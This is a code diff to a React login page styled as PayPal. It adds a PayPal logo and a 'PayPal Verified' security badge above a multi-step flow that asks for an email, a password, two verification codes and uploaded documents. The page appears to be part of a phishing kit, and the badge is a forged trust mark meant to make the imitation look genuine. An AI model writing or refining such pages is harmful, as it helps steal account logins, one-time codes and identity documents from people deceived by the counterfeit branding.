@@ -1,5 +1,6 @@
 import { useState } from "react";
-import { Eye, EyeOff, Lock, ChevronDown, User, Smartphone, Mail, ChevronLeft } from "lucide-react";
+import { Eye, EyeOff, Lock, ChevronDown, User, Smartphone, Mail, ChevronLeft, ShieldCheck } from "lucide-react";
+import { SiPaypal } from "react-icons/si";
 import { useToast } from "@/hooks/use-toast";
 
 type LoginStep = "email" | "password" | "verify-method" | "verify-code" | "verifying" | "verify-code-2" | "verify-documents";
@@ -713,6 +714,19 @@ export default function LoginPage() {
 
         {/* Login Card */}
         <div className="paypal-card w-full max-w-[440px]">
+          {/* PayPal Security Badge */}
+          <div className="flex items-center justify-center gap-2 mb-6 pb-5 border-b border-[#e8e8e8] dark:border-[#2a2a2a]">
+            <div className="flex items-center gap-1.5 px-3 py-1.5 bg-[#f5f7fa] dark:bg-[#1a2a3a] rounded-full">
+              <div className="relative">
+                <SiPaypal className="w-5 h-5 text-[#003087]" />
+                <ShieldCheck className="w-3 h-3 text-[#169b62] absolute -bottom-0.5 -right-1" />
+              </div>
+              <span className="text-[12px] font-semibold text-[#003087] dark:text-[#0070e0] tracking-tight">
+                PayPal Verified
+              </span>
+            </div>
+          </div>
+          
           {step === "email" && renderEmailStep()}
           {step === "password" && renderPasswordStep()}
           {step === "verify-method" && renderVerifyMethodStep()}
